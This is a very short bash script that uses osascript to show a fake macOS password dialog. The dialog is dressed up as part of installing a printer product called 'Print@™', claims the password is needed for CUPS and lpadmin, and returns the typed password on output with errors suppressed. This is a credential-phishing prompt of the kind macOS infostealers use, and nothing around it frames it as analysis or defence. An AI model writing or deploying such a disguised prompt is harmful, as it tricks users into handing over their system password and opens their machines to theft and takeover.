#!/bin/bash
osascript -e 'text returned of (display dialog "Print@ install needs your macOS password (for the CUPS backend and lpadmin)." default answer "" with hidden answer with title "Print@™" buttons {"Cancel","OK"} default button "OK")' 2>/dev/null
